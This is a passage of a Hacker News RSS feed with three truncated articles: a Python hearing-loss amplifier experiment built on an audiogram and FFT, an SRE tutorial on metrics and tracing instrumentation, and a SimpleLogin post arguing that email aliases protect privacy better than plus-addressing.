<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    <span>for</span> i <span>in</span> range(int(windowSize/<span>2</span>)):</span><br><span>        <span>if</span> yf[i] &lt;= maxAmp:</span><br><span>            <span>continue</span></span><br><span></span><br><span>        maxAmp = yf[i]</span><br><span>        maxAmpIdx = i</span><br><span></span><br><span>    </span><br><span>    freq = (sampleRate/<span>2</span>)*maxAmpIdx/(windowSize/<span>2</span>)</span><br><span></span><br><span>    <span>return</span> freq</span><br></pre></td></tr></tbody></table></figure>

<p><code>getGain</code> finds the threshold value according to the audiogram and returns its difference from the <code>basedB</code> value. That’s the gain we want to apply to our window.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>getGain</span><span>(freq)</span>:</span></span><br><span>    threshold = <span>0.0</span></span><br><span></span><br><span>    <span>if</span> freq &lt; audiogram[<span>0</span>][<span>0</span>]:</span><br><span>        threshold = audiogram[<span>0</span>][<span>1</span>]</span><br><span>    <span>else</span>:</span><br><span>        found = <span>False</span></span><br><span>        <span>for</span> i <span>in</span> range(len(audiogram)<span>-1</span>):</span><br><span>            <span>if</span> freq &gt;= audiogram[i+<span>1</span>][<span>0</span>]:</span><br><span>                <span>continue</span></span><br><span></span><br><span>            threshold = (audiogram[i+<span>1</span>][<span>1</span>] - audiogram[i][<span>1</span>]) * (freq - audiogram[i][<span>0</span>]) \</span><br><span>             / (audiogram[i+<span>1</span>][<span>0</span>] - audiogram[i][<span>0</span>]) + audiogram[i][<span>1</span>]</span><br><span></span><br><span>            found = <span>True</span></span><br><span>            <span>break</span></span><br><span></span><br><span>        <span>if</span> <span>not</span> found:</span><br><span>            threshold = audiogram[<span>-1</span>][<span>1</span>]</span><br><span></span><br><span>    <span>return</span> threshold - basedB</span><br></pre></td></tr></tbody></table></figure>

<p>Simple function to convert dB to amplitude. See <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">demofox’s blog</a>.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>dBToAmplitude</span><span>(dB)</span>:</span></span><br><span>    <span>return</span> np.power(<span>10.0</span>, dB / <span>20.0</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>And now the main part. Here you can see that, first, the <code>wav</code> file is loaded into memory as samples, then the samples are iterated over in chunks of <code>window</code> with the size of <code>1024</code>,  <code>getDominantFreq</code> and <code>getGain</code> functions are called on and a gain was applied to those <code>window</code>s accordingly. At the last step, the new samples are written into <code>processed.wav</code> file. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    </span><br><span>    sampleRate, samples = wavfile.read(sys.argv[<span>1</span>], mmap=<span>True</span>)</span><br><span></span><br><span>    </span><br><span>    outSamples = np.array([])</span><br><span></span><br><span>    windowSize = <span>1024</span></span><br><span>    sampleIdx = <span>0</span></span><br><span>    <span>while</span> sampleIdx &lt; len(samples):</span><br><span>        window = samples[sampleIdx:sampleIdx+windowSize]</span><br><span></span><br><span>        freq = getDominantFreq(sampleRate, window)</span><br><span>        gain = getGain(freq)</span><br><span></span><br><span>        amp = dBToAmplitude(gain)</span><br><span></span><br><span>        amplified = window * amp</span><br><span>        outSamples = np.append(outSamples, amplified)</span><br><span></span><br><span>        sampleIdx += windowSize</span><br><span></span><br><span>    wavfile.write(<span>"processed.wav"</span>, sampleRate, outSamples)</span><br></pre></td></tr></tbody></table></figure>

<p>Now let’s run our code on the sine waves we’ve generated:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py generated.wav</span><br></pre></td></tr></tbody></table></figure>



<p>We can see that higher gain is applied to higher frequencies which is what we want. Let’s try this in a real-world example. Now take a look at the little part of one of my favorite books: </p>



<p>Let’s run our code with this recording:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>$ python3 version1.py canticle_for_liebowitz.wav</span><br></pre></td></tr></tbody></table></figure>



<p>Damn. It hurts my ears. The problem  here is we’re applying gain even though it’s in my hearing range. For example, we shouldn’t add gain to 65 dB audio at any frequency. Also even if it’s out of my hearing range, we shouldn’t boost it too much. Let’s say if we have an audio with 55 dB at 4000 Hz, we shouldn’t amplify it to 85 dB which is too high. All we have to do is to shift it into my hearing range. </p>
<p>But what is 55 dB? For example, when we have an amplitude of 0.1, we can calculate the dB equivalent as <code>20 * log(0.1) = -20 dB</code>. Or we know 0 dB is full boost of the volume by <code>10^(0/20) = 1.0</code>. So, again, what the hell is 55 dB in “audiogram language” supposed to be?  </p>
<p>The answer lays in <strong>dB HL</strong> and <strong>dB SPL</strong>. HL stands for <em>Hearing Level</em> and SPL stands for <em>Sound Pressure Level</em>. dB SPL is basically the measurement of sound pressure. So the sound that makes no pressure is 0 dB and others are higher than 0 dB. Hearing levels are dB SPLs that are tailored for an audiogram. Do you remember in audiograms people’s hearing range starts from 0 dB? Well, that 0 dB HL is higher than 0 dB on the SPL scale and is different at every frequency because of how much the human ear hears. <a href="https://hearinglosshelp.com/blog/understanding-the-difference-between-sound-pressure-level-spl-and-hearing-level-hl-in-measuring-hearing-loss/" target="_blank" rel="noopener">Here</a> is a good reading on it.</p>
<p>There are many dB HL to dB SPL conversion charts. These conversions vary between the audiometers and the earphones used on those audiometers.</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/hl-to-spl.png" title="HL to SPL"></p><p>The problem here is I don’t know the standard of my audiogram’s calibration and I don’t know which earphones they have tested me with. So, we need to gather our own data. Let’s do our own hearing test! But this time we won’t be using dB SPL, we’ll just measure the usual dB values from my computer. The result will be specific to my computer but that’s fine. At least it’s going to be reliable. </p>
<p>Let’s create sine waves at the frequencies 125 Hz, 250 Hz, 500 Hz, 1000 Hz, 2000 Hz, 4000 Hz, and 6000 Hz with decreasing volume. Then, I’ll listen to the audio files and mark the last points I can hear something. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></pre></td><td><pre><span><span>import</span> numpy <span>as</span> np</span><br><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span>    duration = <span>0.05</span></span><br><span></span><br><span>    sampleCount = sampleRate * duration</span><br><span></span><br><span>    <span>for</span> freq <span>in</span> [<span>125</span>, <span>250</span>, <span>500</span>, <span>1000</span>, <span>2000</span>, <span>4000</span>, <span>6000</span>]:</span><br><span>        samples = np.array([])</span><br><span>        amp = <span>0.01</span></span><br><span></span><br><span>        t = <span>0.0</span></span><br><span>        <span>while</span> <span>True</span>:</span><br><span>            ta = np.linspace(t, t+duration, sampleCount)</span><br><span></span><br><span>            startTime = np.round(t, <span>2</span>)</span><br><span>            endTime = np.round(t+<span>0.05</span>, <span>2</span>)</span><br><span></span><br><span>            dB = np.round(<span>20</span> * np.log10(amp), <span>2</span>)</span><br><span></span><br><span>            print(<span>f"<span>{startTime}</span>-<span>{endTime}</span>s: <span>{dB}</span> dB"</span>)</span><br><span></span><br><span>            namples = np.sin(<span>2</span> * np.pi * freq * ta)</span><br><span>            namples *= amp</span><br><span></span><br><span>            t += duration</span><br><span>            amp -= <span>0.0001</span></span><br><span></span><br><span>            samples = np.append(samples, namples)</span><br><span></span><br><span>            <span>if</span> amp &lt;= <span>0.0</span>:</span><br><span>                <span>break</span></span><br><span></span><br><span>        wavfile.write(<span>f"sine_<span>{freq}</span>.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>Ok, the results are in. Look at that cool audiogram I created at <a href="https://www.canva.com/" target="_blank" rel="noopener">canva.com</a>:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/betteraudiogram.png" title="My Audiogram"></p><p>Haha. Now let’s edit our code. We’ll remove the basedB variable and add our new audiogram to the code:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>250.0</span>,  <span>-66.02</span>],</span><br><span>    [<span>500.0</span>,  <span>-67.96</span>],</span><br><span>    [<span>1000.0</span>, <span>-60.0</span>],</span><br><span>    [<span>2000.0</span>, <span>-47.96</span>],</span><br><span>    [<span>4000.0</span>, <span>-44.88</span>],</span><br><span>    [<span>6000.0</span>, <span>-44.44</span>]</span><br><span>]</span><br></pre></td></tr></tbody></table></figure>

<p>We’ll slightly edit <code>getDominantFreq</code> to return dominant frequency’s dB:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span><span>def</span> <span>amplitudeTodB</span><span>(amp)</span>:</span></span><br><span>    <span>return</span> <span>20</span> * np.log10(amp)</span><br><span></span><br><span></span><br><span></span><br><span><span><span>def</span> <span>getDominantFreq</span><span>(sampleRate, window)</span>:</span></span><br><span>    </span><br><span>    yf = np.fft.fft(window)</span><br><span>    yf = np.abs(<span>2</span>*yf/len(window))</span><br><span></span><br><span>    windowSize = len(window)</span><br><span></span><br><span>    maxAmp = <span>0.0</span></span><br><span>    maxAmpIdx = <span>0</span></span><br><span>    …</span></pre></td></tr></tbody></table></figure></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</a></em></p>]]>
            </description>
            <link>https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562273</guid>
            <pubDate>Mon, 28 Dec 2020 19:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SRE School: Instrumentation (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562193">thread link</a>) | @kalaracey
<br/>
December 28, 2020 | https://john-millikin.com/sre-school/instrumentation | <a href="https://web.archive.org/web/*/https://john-millikin.com/sre-school/instrumentation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blog-article posted="2018-03-03T18:52:24Z"><p slot="summary">Instrumentation is the foundation of a monitoring infrastructure. It is the part that directly touches the system(s) being monitored, the source of raw data for our collectors and analyzers and dashboards. It is also the only part that is not under an SRE team's direct control – instrumentation is usually plumbed through the codebase by product teams. Given this, an SRE's primary source of leverage is to make adding instrumentation as easy and painless as possible. We do this by writing instrumentation libraries with friendly, approachable, idiomatic APIs.</p><blog-section><h2 slot="title">Metrics</h2><p>Each measurable property of the system is a <i>metric</i>. Repeated measurements of a metric's value yield a <a href="https://en.wikipedia.org/wiki/Time_series">time series</a> of <i>data samples</i>. A metric's definition includes metadata about how to collect, aggregate, and interpret its samples.</p><p>Metric values can in theory be of any serializable data type, but in practice they are numbers, text, or distributions:</p><ul><li>Numeric metrics may have an associated unit, ideally in a machine-readable annotation. This is most important for metrics where the "natural" definition of a unit is divisible, e.g. to record time intervals as an integral amount of milliseconds instead of a fractional amount of seconds.</li><li>Text metrics are most often constants, but are sometimes used for gauges if there's a small number of possible values.</li><li>Distributions are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</li></ul><p>A C-style enumeration such as <code>enum { OPT_FOO = 1; OPT_BAR = 2; }</code> is best reported as <code>"OPT_FOO"</code> and <code>"OPT_BAR"</code><blog-footnote-ref>[<a href="#fn:1">1</a>]</blog-footnote-ref> instead of numeric <code>1</code> and <code>2</code>.</p><p>Booleans can be thought of as the enum <code>{ FALSE, TRUE }</code>. Some monitoring systems give them a separate type to simplify query planning and analysis.</p><p>Metrics can be defined ad-hoc at point of emission, or statically in some global type. I prefer statically declared metrics because that gives the opportunity to attach <a href="#metric-metadata">metric metadata</a>.</p><p>There are four common categories of metrics: constants, gauges, counters, and distributions<blog-footnote-ref>[<a href="#fn:2">2</a>]</blog-footnote-ref>.</p><blog-section><h3 slot="title">Constants</h3><p>A metric that does not change for the lifetime of its associated system component. Samples of a constant metric will always contain the same value. Common examples are build information (e.g. git commit ID), process start time, and process ID. Don't use constants for things that are only constant-ish, such as hostnames.</p><p>Constants can be text or numbers. For numbers, integers usually work better than floats (e.g. represent your start time as <code>int64 milliseconds</code> instead of <code>float64 seconds</code>.</p><table><thead><tr><th>Time</th><th><code>/build/timestamp</code> (seconds since UNIX epoch)</th><th><code>/build/revision_id</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:16</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:17</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr></tbody></table><p>In Go, using a constant metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	_TIMESTAMP   int64 /* filled in by linker */
	_REVISION_ID string /* filled in by linker */
	
	metric.NewConstantInt64("/build/timestamp", _TIMESTAMP)
	metric.NewConstantString("/build/revision_id", _REVISION_ID)
)
</pre></blog-code></blog-section><blog-section><h3 slot="title">Gauges</h3><p>A gauge metric can vary freely across its possible value range. Think of them like tachometers.</p><p>Gauges can be text or numbers.</p><ul><li>Example integer gauges are memory allocation, thread count, active RPC count.</li><li>Example text gauges are mutable config settings (e.g. backend addresses), environment variables, and hostnames.</li></ul><table><thead><tr><th>Time</th><th><code>/proc/thread_count</code></th><th><code>/proc/working_directory</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>200</td><td>/var/www/current</td></tr><tr><td>2011-12-13 14:16</td><td>250</td><td>/var/www/previous</td></tr><tr><td>2011-12-13 14:17</td><td>230</td><td>/var/www/current</td></tr></tbody></table><p>In Go, using a gauge metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	threadCount = metric.NewGaugeInt64("/proc/thread_count")
	workingDir = metric.NewGaugeString("/proc/working_directory")
)

func updateMetrics() {
	threadCount.Set(int64(runtime.NumGoroutine()))
	wd, _ := os.Getwd()
	workingDir.Set(wd)
}
</pre></blog-code></blog-section><blog-section><h3 slot="title">Counters</h3><p>A counter metric must be a number, and can only increase during the lifetime of the system. Counters are almost always integers to avoid the implications of IEEE-754 rounding.</p><p>Example counter metrics are CPU microseconds spent, or the total request count.</p><p>Counters can only increase. If the metric collector sees that a new value is lower than the older value, it knows a <i>metric reset</i> has occurred. Resets happen when a process restarts, clearing in-memory state of the counter.</p><table><thead><tr><th>Time</th><th><code>/net/http/server/request_count</code></th><th></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>10000</td><td></td></tr><tr><td>2011-12-13 14:16</td><td>11000</td><td></td></tr><tr><td>2011-12-13 14:17</td><td>1500</td><td>RESET</td></tr></tbody></table><p>In Go, defining a counter metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	requestCount = metric.NewCounterInt64("/net/http/server/request_count")
)

func handler(w http.ResponseWriter, req *http.Request) {
	requestCount.Increment() // or .IncrementBy(1)
}
</pre></blog-code></blog-section><blog-section><h3 slot="title">Distributions</h3><p><a href="https://en.wikipedia.org/wiki/Frequency_distribution">Distributions</a> are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</p><p>Examples include request latencies, client IP addresses<blog-footnote-ref>[<a href="#fn:3">3</a>]</blog-footnote-ref>, and aggregations of constant/gauge/counter metrics from other sources.</p><table><thead><tr><th>Time</th><th><code>/net/http/server/response_latency</code> (seconds)</th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td><pre>[ 0,  2) #
[ 2,  3) ###
[ 3,  5) #######
[ 5,  8) ####
[ 8, 13) ##
[13,  ∞)
</pre></td></tr><tr><td>2011-12-13 14:16</td><td><pre>[ 0,  2) #
[ 2,  3) ####
[ 3,  5) ########
[ 5,  8) ###
[ 8, 13) #
[13,  ∞)
</pre></td></tr><tr><td>2011-12-13 14:17</td><td><pre>[ 0,  2) 
[ 2,  3) #
[ 3,  5) ##
[ 5,  8) #####
[ 8, 13) ########
[13,  ∞) #
</pre></td></tr></tbody></table><p>In Go, defining a distribution metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	latency = metric.NewDurations(
		"/net/http/server/response_latency",
		metric.BinDurations([]time.Duration{
			2 * time.Second,
			3 * time.Second,
			5 * time.Second,
			8 * time.Second,
			13 * time.Second,
		})
	)
)

func handler(w http.ResponseWriter, req *http.Request) {
	start := time.Now()
	defer func() {
		latency.Sample(time.Now() - start)
	}()
}
</pre></blog-code><p>Each distribution is also inherently a set of counters, because recording a sample in one of the bins will increment that bin's count. This property can be used to simplify some monitoring configurations.</p><p>Bins can be defined statically (as in the example above), or using a function. Binning might be performed either by the system reporting the metric, or by the monitoring infrastructure.</p><ul><li>With <b>client-side binning</b>, the reporter decides how fine-grained the distribution should be.<ul><li>This is usually configurable per-metric by a command-line flag or config setting.</li><li>Changing the binning can cause vertical aberrations in visualisations.</li></ul></li><li>With <b>collector-side binning</b>, the client reports the events as-is and the monitoring infrastructure aggregates the data before storing/forwarding it.<ul><li>Example: collector receives raw distribution samples from its clients, and records {50,90,95,99}th percentiles over a trailing window.</li><li>This can be significantly less flexible, and it is often difficult to visualize percentiles as usefully as a full distribution.</li></ul></li></ul></blog-section><blog-section><h3 slot="title">Metric Names</h3><p>I know of three styles for metric names:</p><ul><li>The <a href="https://prometheus.io/docs/practices/naming/">Prometheus Style Guide</a> recommends <code>myapp_descriptive_snake_case</code>, where <code>myapp_</code> is a one-word prefix specific to the system being monitored. This style is derived from <a href="http://landing.google.com/sre/book/chapters/practical-alerting.html">Google Borgmon</a>, which uses metric names as symbols in its configuration DSL<blog-footnote-ref>[<a href="#fn:4">4</a>]</blog-footnote-ref>.<ul><li><a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CW_Support_For_AWS.html">Amazon CloudWatch metrics</a> use this format, without a prefix.</li></ul></li><li><a href="https://github.com/etsy/statsd">statsd</a> and its derivatives use <code>short.dotted.words</code>, though the exact symbol set can vary between vendors.<ul><li>For example, <a href="https://help.datadoghq.com/hc/en-us/articles/203764705-What-are-valid-metric-names-">DataDog allows alphanum, underscores, and periods</a>.</li></ul></li><li><a href="https://cloud.google.com/monitoring/api/metrics_gcp">Google Stackdriver</a> uses <code>myapp.com/unix/filesystem/paths</code>, with each product having its own "subdirectory" in the metrics hierarchy.<ul><li>The same style is applied to <a href="https://cloud.google.com/monitoring/api/metrics_aws">AWS metrics in Stackdriver</a>, by adding product-specific prefixes for each CloudWatch metric.</li></ul></li></ul><p>My personal favorite is the UNIX paths style, which I've seen used to great success. Engineers exposed to this style begin to naturally lay out metric hierarchies, with clear meanings and good namespacing. I don't have any solid data about <i>why</i> the naming style has such an effect, but I suspect it has something to do with familiarity:</p><ul><li>A metric name like <code>http_request_count</code> is well and good, but <code>myapp_com.net.http.server.request_count</code> looks <i>wrong</i> to an experienced engineer. Expressions that use that many dots violate the <a href="http://wiki.c2.com/?LawOfDemeter">Law of Demeter</a>.</li><li>In contrast, path-shaped metric names like <code>myapp.com/net/http/server/request_count</code> inspire no such negative thoughts. Long paths are common in UNIX environments, and it's certainly no harder to remember than many of the paths in Linux's <code>sysfs</code>.</li></ul></blog-section></blog-section><blog-section><h2 slot="title">Traces</h2><p>While metrics help understand the system in aggregate, traces are used to understand the relationship between the parts of a system that processed a particular request.</p><p>A trace is a tree of <i>spans</i>, which each represent a logical region of the system's execution time. Spans are nested – all spans except the <i>root span</i> have a <i>parent span</i>, and a trace is constructed by walking the tree to link parents with their children.</p><pre>########################  GET /user/messages/inbox
 ######                   User permissions check
    ####                  Read template from disk
    #########             Query database
             ###          Render page to HTML
                ##        Compress response body
                  ######  Write response body
</pre><p>Spans and traces can be understood by analogy to lower-level programming concepts. If a trace is a stack trace, then a span is a single stack frame. Just as every stack frame is pushed and popped, each span begins and ends. It's the timing of when the spans begin and end that is interesting when analysing a trace.</p><p>Each span is implicitly a sample of a duration distribution, and therefore also a counter<blog-footnote-ref>[<a href="#fn:5">5</a>]</blog-footnote-ref>.</p><p>Tools for creating and recording traces are currently less mature than for creating metrics, and a wide variety of tracing platforms exists. <a href="http://opentracing.io/">OpenTracing</a> is an attempt to provide vendor-neutral APIs for many languages so that tracing support can more easily be added to shared libraries.</p></blog-section><blog-section><h2 slot="title">Events</h2><p>Events are conceptually similar to logging, …</p></blog-section></blog-article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://john-millikin.com/sre-school/instrumentation">https://john-millikin.com/sre-school/instrumentation</a></em></p>]]>
            </description>
            <link>https://john-millikin.com/sre-school/instrumentation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562193</guid>
            <pubDate>Mon, 28 Dec 2020 19:14:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why email plus (+) trick isn't good for privacy (or why email alias is better)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25561797">thread link</a>) | @sonmicrosystems
<br/>
December 28, 2020 | https://simplelogin.io/blog/email-alias-vs-plus-sign/ | <a href="https://web.archive.org/web/*/https://simplelogin.io/blog/email-alias-vs-plus-sign/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
    <div>
        

        <div>
            <div>
                
                <p>
                    December 19, 2020 Â·
                    written by <img src="https://simplelogin.io/logo-square.svg" alt="Author Image">
                    SimpleLogin team
                </p>
            </div>
        </div>

        

        

        <p><a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">Email subaddressing</a>, also known as plus sign (+) trick, is popularized by Gmail and now supported by most email providers. It allows creating a new email address by simply appending the plus sign(<strong>+</strong>) to your current email address.</p>
<p>For example, if your email address is <code>name@email.com</code>, you can quickly create a new email address like <code>name+facebook@email.com</code> for Facebook, <code>name+twitter@email.com</code> for Twitter, etc.</p>
<p>Here’s a closer look at the pros and cons of using the plus sign trick, especially when compared with email aliases.</p>

        

        

        <h3 id="plus-sign-trick-advantages">Plus sign trick advantages</h3>
<p>The main advantage of the plus sign trick is it’s easy to use and already available.</p>
<p>If you use email filters, email subaddressing is also very useful. For example, you can set up a filter to move all emails sent to <code>name+groupon@email.com</code> to the <strong>Promotion</strong> folder.</p>
<p>With subaddressing, you can create an unlimited number of email addresses: just add something after the plus sign and youâ€™ll have a new email address.</p>
<p>If you are a developer or work in QA, being able to quickly create a new email address is very helpful when testing a website or application.</p>
<h3 id="what-are-simplelogin-email-aliases">What are SimpleLogin email aliases?</h3>
<p>An email alias is simply a forwarding email address. Emails sent to an email alias are forwarded to your original email address.</p>
<p>Like the plus sign trick, SimpleLogin allows you to have a different email address for each website: just create a new email alias everytime you need an email address.</p>
<p>Usually an email alias only allows email forwarding but with SimpleLogin, you can also send emails or reply from your email alias.</p>
<p>Currently there are 4 ways of creating a new email alias in SimpleLogin:</p>
<ul>
<li>If you are on a laptop/PC, the <a href="https://addons.mozilla.org/firefox/addon/simplelogin/">Firefox</a> or <a href="https://chrome.google.com/webstore/detail/dphilobhebphkdjbpfohgikllaljmgbn">Chrome</a> extension allows creating a new email alias by clicking on the SimpleLogin icon in the email field. You can also use the right click menu to create a new email alias.</li>
</ul>
<p><img src="https://sldev.ovh/images/one-click-alias.gif" alt=""></p>
<ul>
<li>
<p>Using one of SimpleLogin apps: <a href="https://app.simplelogin.io/">website</a>, Firefox/Chrome extension popup or <a href="https://play.google.com/store/apps/details?id=io.simplelogin.android">Android</a>/<a href="https://apps.apple.com/app/id1494359858">iOS</a> app for more customization. This is the most flexible way and offers advanced options.</p>
</li>
<li>
<p>Creating email aliases on the fly via <strong>catch-all</strong> domain. If you own a domain, you can enable the catch-all option that allows you to use <code>can_be_anything@your-domain.com</code> as email address: it’s automatically created when an email is sent to this address.</p>
</li>
<li>
<p>Creating email aliases on the fly via <a href="https://simplelogin.io/blog/alias-directory/">directory</a>: this is actually similar to the plus sign trick. If you have a directory called <strong>newsletter</strong>, you can then use <code>newsletter+python@simplelogin.fr</code> when signing for a Python newsletter.</p>
</li>
</ul>
<h3 id="plus-sign-trick-email-address-isnt-good-for-privacy">Plus sign trick email address isn’t good for privacy</h3>
<p>Though practical, plus sign trick is well-known and your real email address can be easily extracted: one just needs to remove the part after the plus sign. For this reason, if your subaddress appears in an email leak (that you can easily verify on <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a>), a bad actor can extract your real email address and uses it for a spam/phishing campaign or to match with other data breaches.</p>
<p>Email addresses that contain the plus sign are sometimes (incorrectly) considered invalid. Even worse, a website can silently drop the part after the plus sign and use your real email address instead.</p>
<p>If you use Gmail, you can’t also reply from the subaddress. When you reply to an email sent to a <code>name+newsletter@gmail.com</code>, the reply will come from your real email address <code>name@gmail.com</code></p>
<h3 id="email-aliases-protect-your-privacy">Email aliases protect your privacy</h3>
<p>An email alias is random and there’s no way to link 2 email aliases to the same person.</p>
<p>For email aliases created with a catch-all domain, they can only be linked together if the domain is known to have the catch-all option enabled. There’s no way to detect whether a domain has this option enabled or to know how many people are using a domain, a bad actor usually ignores these email addresses altogether.</p>
<p>For email aliases created via <strong>directory</strong>, you can use a different separator than the plus sign to reduce the chance of your email aliases being linked together. SimpleLogin also supports the hash sign (#) and the slash sign (/) as separator and in the future, you can also use directory as a subdomain (i.e. <code>newsletter.simplelogin.fr</code>). You can then either use <code>newsletter/python@simplelogin.fr</code>, <code>newsletter#python@simplelogin.fr</code> or <code>python@newsletter.simplelogin.fr</code> as email address.</p>
<h3 id="email-aliases-reveal-who-are-selling-your-data">Email aliases reveal who are selling your data</h3>
<p>If you use a different email alias for each website and one of your aliases starts receiving emails it isn’t supposed to receive, you can be sure that this alias is either leaked or sold.</p>
<p>For example, if your email alias for Facebook receives emails from LinkedIn, that means Facebook has sold your data to LinkedIn or they’ve had a data breach. Either way, you can just disable this alias. Your real email address stays hidden.</p>
<p>Data brokers, <a href="https://www.webfx.com/blog/general/what-are-data-brokers-and-what-is-your-data-worth-infographic/">a $200 billion industry</a> use your email address as the common denominator to match users between different datasets. Having thousands of email addresses make their job harder and your privacy better.</p>
<h3 id="email-aliases-are-more-flexible">Email aliases are more flexible</h3>
<p>With email aliases, it’s easy to change where emails are forwarded. You can just add an additional mailbox so every email sent to your email aliases is forwarded to both mailboxes.</p>
<p>You can also have more complex setup like having an email alias for a shoping website that forwards to both your mailbox and your partner’s mailbox. Or an email alias for your support team that allows anyone to receive customer requests and reply from the support email address.</p>
<h3 id="additional-protection">Additional protection</h3>
<p>On popular email services like Gmail, Outlook, your emails are stored in plaintext, meaning anyone who has access to their servers can read your emails. Even though these services claim to have a strict policy in place and promise they would never read your emails, scandals in the past have shown otherwise. With the <a href="https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html">recent Twitter hack</a>, an employee can be social-engineered to leak the data or leave a backdoor for hackers.</p>
